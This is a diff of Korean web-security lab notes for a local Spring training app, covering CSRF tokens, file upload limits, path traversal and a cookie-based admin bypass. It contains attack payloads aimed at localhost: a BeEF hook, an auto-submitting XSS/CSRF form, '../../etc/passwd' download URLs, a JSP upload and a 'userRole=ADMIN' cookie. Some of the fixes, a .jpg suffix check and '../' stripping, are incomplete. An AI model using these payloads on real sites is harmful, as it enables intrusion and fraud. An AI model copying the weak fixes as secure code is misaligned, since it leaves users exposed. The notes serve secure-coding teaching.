@@ -75,6 +75,8 @@ BeEF<script src="http://localhost:3000/hook.js"></script>
 
 패스워드 변경 기능
 
+임의의 난수를 생성 => abcd ~~~~~~~~~~~~~~~~~~~~~~> 세션에 저장
+
 패스워드 변경 신청                       패스워드 변경 처리
 changePwForm                            changePwProc
 
@@ -84,6 +86,9 @@ New PW 2: _______                       2) 처리에 필요한 값 중
           [ 변경 ]                      3) 처리에 필요한 값 중 
                                            서버가 가지고 있는 값을 확인 
                                         4) 사용자의 패스워드를 새 패스워드로 변경
+
+<input type="hidden"
+       value="abcd"/>
 
 회원제 서비스를 제공하는 게시판에 아래와 같은 공격 코드를 삽입
 꼭 보세요.
@@ -135,3 +140,286 @@ New PW 2: _______                       2) 처리에 필요한 값 중
 <textarea name="content"></textarea>
 <button type="submit">저장</button>
 </form>
+
+
+
+서버로 전달되는 내용을 자동으로 요청하는 코드를 추가 
+
+</textarea>
+<iframe name="x" style="display:none;"></iframe>
+<form action="http://localhost:8080/regist/register" method="post" target="x">
+<input name="name" id="n">
+<input name="email" id="e">
+<input name="phone" id="t">
+<input name="password" id="p">
+<textarea name="content" id="c"></textarea>
+<button type="submit" id="b">저장</button>
+</form>
+<script>
+window.setTimeout(doSubmit, 1000);
+function doSubmit() {
+    const id = Math.floor((Math.random() * 100) + 1);
+    document.getElementById("n").value = id;
+    document.getElementById("e").value = id + "@hacker.com";
+    document.getElementById("t").value = "010-0000-0000";
+    document.getElementById("p").value = id;
+    document.getElementById("c").value = "직장인 대상 저렴한 대출 안내";
+    document.getElementById("b").click();
+}
+</script>
+
+
+
+참가 신청 페이지에 하고 싶은 말 입력창에 입력 후 저장
+--> 사용자 화면에는  XSS 공격을 방어하고 있기 때문에 스크립트 코드가 실행되지 않음
+
+
+관리자로 로그인해서 참가 현황을 조회
+--> XSS 공격을 방어하고 있지 않으므로 자동화된 코드에 의해서 등록 신청을 요청
+--> 서버에서 요청을 검증하지 않고 처리하는 경우, 공격자가 넣은 내용이 등록되는 것을 확인할 수 있음
+
+<div class="form-group">
+    <label>하고싶은 말</label>
+    <textarea class="form-control" rows="3" name="content" readonly="readonly">
+
+</textarea>
+<iframe name="x" style="display:none;"></iframe>
+<form action="http://localhost:8080/regist/register" method="post" target="x">
+<input name="name" id="n">
+<input name="email" id="e">
+<input name="phone" id="t">
+<input name="password" id="p">
+<textarea name="content" id="c"></textarea>
+<button type="submit" id="b">저장</button>
+</form>
+<script>
+window.setTimeout(doSubmit, 1000);
+function doSubmit() {
+    const id = Math.floor((Math.random() * 100) + 1);
+    document.getElementById("n").value = id;
+    document.getElementById("e").value = id + "@hacker.com";
+    document.getElementById("t").value = "010-0000-0000";
+    document.getElementById("p").value = id;
+    document.getElementById("c").value = "직장인 대상 저렴한 대출 안내";
+    document.getElementById("b").click();
+}
+</script>
+
+</textarea>
+        		</div>
+
+
+
+
+
+참가 신청이 자동으로 처리되지 않도록 수정 => CSRF 취약점을 방어
+
+#1 신청 페이지 요청이 들어왔을 때 임의의 난수를 생성하고 생성한 값을 세션에 저장
+RegistController.java
+
+    /* LAB CSRF : Insecure Code */
+    @GetMapping("/register")
+    public void register(HttpSession session) {
+    	String token = UUID.randomUUID().toString();
+    	session.setAttribute("csrf_s_token", token);
+    }
+
+
+#2 세션에 저장된 토큰을 서버로 전달할 수 있도록 신청 페이지에 추가 
+regist/register.jsp
+
+    <div class="panel-body">
+        <form role="form" action="/regist/register" method="post" data-toggle="validator">
+            <input type="hidden" name="csrf_p_token" value="${csrf_s_token}" />
+
+
+#3 신청 요청을 처리할 때 세션에 저장된 값과 요청 파라미터로전 전달된 값을 비교 후 요청을 처리
+RegistController.java
+
+    /* LAB SQL Injection : Insecure Code */
+    @PostMapping("/register")
+    public String register(HttpServletRequest request, HttpSession session, RedirectAttributes rttr, RegistVO rgvo) {
+    	
+        HashMap<String, String> hm = new HashMap<String, String>();
+
+        String stoken = (String) session.getAttribute("csrf_s_token");
+        String ptoken = request.getParameter("csrf_p_token");
+        
+        if (ptoken == null || !ptoken.equals(stoken)) {
+        	hm.put("msg", CommonMessage.MSG_INSERT_FAIL);
+            rttr.addFlashAttribute("result", hm);
+            return "redirect:/regist/register";
+        }
+
+
+참가 신청 => 토큰과 함께 전달되기 때문에 신청이 완료        
+<form role="form" action="/regist/register" method="post" data-toggle="validator">
+<input type="hidden" name="csrf_p_token" value="388b7ded-d3e1-4118-a567-a39bb8a6e1a0" />
+
+
+관리자 페이지에서 "공격자" 신청 현황을 조회
+
+
+
+
+
+참가 신청 페이지에 이미지 파일을 추가
+
+참가 신청 페이지에 JSP 파일을 추가 => 파일의 종류를 제한하고 있지 않음
+
+http://localhost:8080/resources/img/20250812/고양이.jpg
+http://localhost:8080/resources/20250812/고양이.jpg
+http://localhost:8080/resources/20250812/1.jsp
+
+
+
+파일 업로드 취약점을 방어하는 코드를 추가 
+
+업로드 파일의 저장 위치, 크기, 갯수, 종류를 제한 ==>  WebConfig.java
+
+    @Override
+    protected void customizeRegistration(ServletRegistration.Dynamic registration) {
+        registration.setInitParameter("throwExceptionIfNoHandlerFound", "true");
+
+        /* LAB File Upload : Insecure Code */
+        String path = CommonCode.CONT_UPLOAD_FILE_DIR;
+        MultipartConfigElement multipartConfig 
+        	= new MultipartConfigElement(path, 20971520, 41943040, 20971520);
+        registration.setMultipartConfig(multipartConfig);
+    }
+
+
+UploadController.java ==> 업로드 파일의 저장 위치를 변경
+    
+    /* LAB File Upload : Insecure Code */
+    @PostMapping(value = "/uploadAjaxAction", produces = MediaType.APPLICATION_JSON_UTF8_VALUE)
+    @ResponseBody
+    public ResponseEntity<List<AttachFileDTO>> uploadAjaxPost(MultipartFile[] uploadFile, HttpSession session) {
+
+        List<AttachFileDTO> list = new ArrayList<>();
+
+        String uploadFolderPath = getSaveDir();
+        // File uploadPath = new File(session.getServletContext().getRealPath("/resources"), uploadFolderPath);
+        File uploadPath = new File(CommonCode.CONT_UPLOAD_FILE_DIR, uploadFolderPath);
+        if (!uploadPath.exists()) {
+            uploadPath.mkdirs();
+        }
+
+
+UploadController.java ==> 파일 확장자를 체크하는 로직을 추가하고, 저장 파일명에 외부에서 유추할 수 없는 값을 추가 
+
+        for (MultipartFile multipartFile : uploadFile) {
+            AttachFileDTO attachDTO = new AttachFileDTO();
+
+            String uploadFileName = multipartFile.getOriginalFilename();
+            uploadFileName = uploadFileName.substring(uploadFileName.lastIndexOf("\\") + 1);
+            attachDTO.setFileName(uploadFileName);
+            
+            // 파일명이 .jpg로 끝나는지 확인
+            if (!uploadFileName.endsWith(".jpg")) {
+            	continue;
+            }
+            
+            // 파일명에 uuid를 추가
+            String uuid = UUID.randomUUID().toString();
+            uploadFileName = uuid + "_" + uploadFileName;
+            
+            try {
+                File saveFile = new File(uploadPath, uploadFileName);
+                multipartFile.transferTo(saveFile);
+                attachDTO.setUploadPath(uploadFolderPath);
+                // uuid를 DB에 저장
+                attachDTO.setUuid(uuid);
+                if (checkImageType(saveFile)) {
+                    attachDTO.setImage(true);
+                }
+                list.add(attachDTO);
+
+            } catch (Exception e) {
+                log.error(e.getMessage());
+            }
+        }
+
+
+업로드 파일을 저장할 디렉터리를 생성 
+┌──(kali㉿kali)-[~]
+└─$ sudo mkdir -p /temp/upload
+[sudo] password for kali: kali
+
+┌──(kali㉿kali)-[~]
+└─$ sudo chown kali:kali /temp/upload
+
+┌──(kali㉿kali)-[~]
+└─$ ls -l /temp/
+total 4
+drwxr-xr-x 2 kali kali 4096 Aug 12 02:32 upload
+        
+
+
+서버에서 실행 가능한 파일을 업로드 ==> 차단
+
+.jpg 파일은 정상적으로 업로드되는 것을 확인
+
+┌──(kali㉿kali)-[~]
+└─$ ls /temp/upload                                                  
+20250812
+
+┌──(kali㉿kali)-[~]
+└─$ ls /temp/upload/20250812
+030f72a2-457c-49ad-ba9b-7d26d4f5c156_강아지.jpg
+
+
+
+
+업로드 취약점을 방어하면 필연적으로 다운로드 기능이 필요 
+다운로드 기능을 구현할 때 유의해야 하는 사항 
+
+download?file=/data/upload/20250812/myfile          <== 파일 경로를 매개변수로 처리
+~~~~~~~~
+File f = new File(request.getParameter("file"));
+
+download?file=/etc/passwd                           <== 접근하면 안 되는 시스템 파일을 다운로드 가능
+
+
+
+
+download?file=/20250812/myfile     <== 파일 경로의 일부만 전달 (실제 파일 저장소를 캡슐화)
+~~~~~~~~
+File f = new File("/data/upload/" + request.getParameter("file"));
+
+download?file=../../../../../etc/passwd     <== 지정된 경로를 벗어나 접근하면 안 되는 시스템 파일을 다운로드 가능
+                                                <== 경로 조작 취약점 
+                                                    ~~~~~~~~~~~~~~~
+                                                    외부 입력값을 파일의 식별자로 사용하는 경우 
+                                                    외부 입력값에 경로 조작 문자열( . .. / \ ) 포함 여부를 확인하지 않고
+                                                    파일 식별자로 사용하는 경우에 발생
+
+http://localhost:8080/download?fileName=20250812%2F%EA%B0%95%EC%95%84%EC%A7%80.jpg
+http://localhost:8080/download?fileName=../../../../../../../../../../../../../../../etc/passwd
+
+
+다운로드 기능에 경로 조작 취약점을 방어
+UploadController.java
+
+    /* LAB File Download : Insecure Code */
+    @GetMapping(value = "/download", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
+    @ResponseBody
+    public ResponseEntity<Resource> downloadFile(@RequestHeader("User-Agent") String userAgent, String fileName,
+            HttpSession session) {
+        if (fileName != null) {
+            fileName = fileName.replaceAll("[\\r\\n]", "");
+            fileName = fileName.replaceAll("\\.{2,}[/\\\\]", "");
+        }
+
+
+
+관리자 전용 주소 = 관리자 권한을 가지고 있는 사람만 접근할 수 있는 페이지
+http://localhost:8080/admin/registList <= 신청현황
+=> 관리자 로그인 페이지로 리다이렉션
+
+개발자 도구의 콘솔을 이용해서 쿠키를 설정한 후 
+document.cookie="userRole=ADMIN"
+http://localhost:8080/admin/registList 
+=> 신청 현황이 출력 
+
+
